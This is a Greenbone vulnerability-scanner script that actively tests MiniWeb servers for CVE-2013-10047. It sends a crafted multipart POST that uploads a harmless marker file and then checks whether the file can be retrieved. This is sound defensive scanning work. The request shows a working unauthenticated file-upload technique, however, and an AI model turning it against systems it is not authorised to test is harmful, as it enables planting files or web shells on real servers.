# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803477");
  script_version("2025-08-07T05:44:51+0000");
  script_tag(name:"last_modification", value:"2025-08-07 05:44:51 +0000 (Thu, 07 Aug 2025)");
  script_tag(name:"creation_date", value:"2013-04-17 18:42:05 +0530 (Wed, 17 Apr 2013)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2013-10047");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("MiniWeb <= build 300 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8000);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"MiniWeb is prone to file upload and directory traversal
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Improper sanitation of user supplied input via the 'filename'
  parameter and uploading a file to a non existing directory.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to overwrite
  legitimate content and upload files to arbitrary locations outside of the web path.");

  script_tag(name:"affected", value:"MiniWeb build 300 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20140802044744/http://secunia.com/advisories/52923/");
  script_xref(name:"URL", value:"https://web.archive.org/web/20200229090018/http://www.securityfocus.com/bid/58946");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121168");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/52923");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/52923");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/27607");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8000);

vt_strings = get_vt_strings();

url = "/AAAAAAAAAAAAAAAAAAAAA";

file = vt_strings["lowercase_rand"] + ".txt";
bound = vt_strings["default_rand"];

headers = make_array("Content-Type", "multipart/form-data; boundary=" + bound);

data = '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="user"\r\n\r\n' +
       'Username\r\n' +
       '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="pass"\r\n\r\n' +
       'Password\r\n' +
       '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="file"; filename="' + file + '"\r\n' +
       'Content-Type: text/plain\r\n\r\n' +
       'File-Upload-Vulnerability-Test\r\n\r\n' +
       '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="button"\r\n\r\n' +
       'Upload\r\n' +
       '--' + bound + '--\r\n';

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
http_keepalive_send_recv(port: port, data: req);

if (http_vuln_check(port: port, url: "/" + file, check_header: TRUE,
                    pattern: "File-Upload-Vulnerability-Test")) {
  report = "It was possible to upload the file '" + file + "' which is accessible via " +
           http_report_vuln_url(port: port, url: url, url_only: TRUE) +
           '\n\nPlease manually remove this file.';
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
